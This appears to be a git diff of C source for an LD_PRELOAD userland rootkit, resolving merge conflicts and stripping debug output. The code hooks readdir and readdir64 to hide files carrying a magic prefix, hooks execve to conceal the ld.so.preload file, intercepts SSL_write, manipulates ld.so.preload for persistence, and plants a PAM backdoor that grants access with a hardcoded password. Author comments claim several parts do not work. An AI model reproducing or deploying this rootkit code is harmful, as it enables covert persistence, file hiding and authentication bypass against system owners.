@@ -19,8 +19,8 @@
 #endif
 
 /*---------[ PROTOTYPES ]---------*/
-static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
 static struct dirent*   (*og_readdir)(DIR *)       = NULL;
+static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
 static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
 static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
 static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
@@ -33,11 +33,6 @@ int isDebuggerPresent();
 /*---------[ INITIALIZE THE HOOKS ]---------*/
 __attribute__((constructor)) void hook_init(void){
   og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
-  printf("[+] readdir hooked\n");
-  if (dlerror() != NULL) {
-    fprintf(stderr, "Error: %s\n", dlerror());
-    exit(EXIT_FAILURE);
-  }
   og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
   printf("[+] readdir64 hooked\n");
   if (dlerror() != NULL) {
@@ -54,6 +49,7 @@ __attribute__((constructor)) void hook_init(void){
 }
 
 /*---------[ PERSISTENCE CHECK AND LD.SO.PRELOAD MANIPULATION ]---------*/
+// doesnt work
 __attribute__((constructor)) void PersistCheck(void) {
   FILE* fd;
   FILE* temp_fd;
@@ -105,6 +101,7 @@ __attribute__((constructor)) void PersistCheck(void) {
 }
 
 /*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
+// probably doesnt work
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
   char* ldd = "/bin/ldd";
   char* unhide = "/bin/unhide";
@@ -124,18 +121,16 @@ int execve(const char *pathname, char *const argv[], char *const envp[]) {
 /*---------[ HIDING FILES ]---------*/
 struct dirent* readdir(DIR *dirp){
   struct dirent* entry;
-  printf("[+] in hooked function\n");
   while ((entry = og_readdir(dirp)) != NULL) {
     if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
-      printf("[i] skipped\n");
       continue;    
     }
-    printf("[i] In while loop\n");
     return entry;
   }
   return entry;
 }
 // handle 64bit version
+// DOESNT FUCKING WORK
 struct dirent64* readdir64(DIR* dirp) {
   struct dirent64* entry;
   printf("[+] in hooked function\n");
@@ -169,6 +164,7 @@ int SSL_write(SSL* ssl, const void *buf, int num) {
   return og_SSL_write(ssl, buf, num);
 }
 /*---------[ PAM BACKDOOR ]---------*/
+// DOESNT WORK
 int backdoor = 0;
 
 // elevate privileges:
@@ -222,12 +218,7 @@ PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
     return og_pam_auth(pamh, flags);
   }
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-<<<<<<< HEAD
-  printf("%s", input_passwd);
   char* password = "rootkitty";
-=======
-  char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
->>>>>>> f479cc0c4bca1cd3d5b66957d46722aa2d5b3952
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
@@ -243,11 +234,7 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags){
   }
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-<<<<<<< HEAD
   char* password = "rootkitty";
-=======
-   char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
->>>>>>> f479cc0c4bca1cd3d5b66957d46722aa2d5b3952
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
@@ -264,11 +251,7 @@ const char* input_passwd;
   }
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-<<<<<<< HEAD
   char* password = "rootkitty";
-=======
-   char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
->>>>>>> f479cc0c4bca1cd3d5b66957d46722aa2d5b3952
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
